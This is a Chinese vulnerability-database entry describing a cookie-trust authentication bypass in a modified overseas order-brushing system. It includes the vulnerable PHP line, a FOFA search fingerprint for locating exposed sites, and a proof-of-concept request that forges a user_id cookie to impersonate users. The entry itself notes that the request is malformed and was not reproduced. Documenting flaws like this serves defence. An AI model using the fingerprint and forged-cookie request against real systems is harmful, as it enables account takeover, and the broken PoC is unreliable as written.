---
source: "wy876 漏洞文库"
title: "匿名二开海外抢单系统 信任user_id Cookie导致冒用用户"
product: "匿名二开海外抢单系统"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "仅二开版本，原项目/提交未知"
prerequisites: "需无有效Session走Cookie回退"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ixpcs4iq19u5yrp4"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B5%B7%E5%A4%96%E6%8A%A2%E5%8D%95%E5%88%B7%E5%8D%95/%E6%9F%90%E4%BA%8C%E5%BC%80%E7%89%88%E6%B5%B7%E5%A4%96%E6%8A%A2%E5%8D%95Shua%E5%8D%95%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E6%BC%8F%E6%B4%9E.md"
previous_fofa_unverified: "/red/popper.min.js"
id: "vw-eceafaa767f231aa49cba1e4"
entity_id: "ve-eceafaa767f231aa49cba1e4"
schema_version: "1"
fofa: "\"/red/popper.min.js\""
---

# 匿名二开海外抢单系统 信任user_id Cookie导致冒用用户

## 条目说明

- 对象与具体问题：匿名二开海外抢单系统；信任user_id Cookie导致冒用用户
- 版本、配置及部署条件：仅二开版本，原项目/提交未知
- 认证与权限前提：需无有效Session走Cookie回退
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 代码片段说明Session缺失时信任客户端ID，不能扩大所有海外刷单源码版本
- user_id1只示例目标，不保证管理员或任意已存在用户权能；需会话差异证明
- GET声明Content-Length73但无正文、CSRF与X-Requested-With粘连，请求格式损坏
- 无返回/修复/完整源码，保留匿名案例归属

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
位于 /index/controller/Base.php 控制器的 __construct 方法作为验证登录控制器，来验证用户是否登录，然而这套系统实际采用两套验证用户的方法，Session和Cookie并存，其中 if (!$uid) { $uid = cookie('user_id'); } 这句话是关键，如果Session中没有发现user_id，那么直接验证Cookie中的user_id，而Cookie是可以伪造的，这里导致漏洞产生。

## 二、影响版本
+ 海外刷单系统

## 三、资产测绘
+ fofa`"/red/popper.min.js"`
+ 特征


## 四、漏洞复现
```http
GET /index/index HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br, zstd
Accept-Language: zh-CN,zh;q=0.9,ru;q=0.8,en;q=0.7
Connection: keep-alive
Content-Length: 73
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: user_id=1
Host:
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
User-Token-Csrf: csrf66e28d7ebbffaX-Requested-With: 
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ixpcs4iq19u5yrp4>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
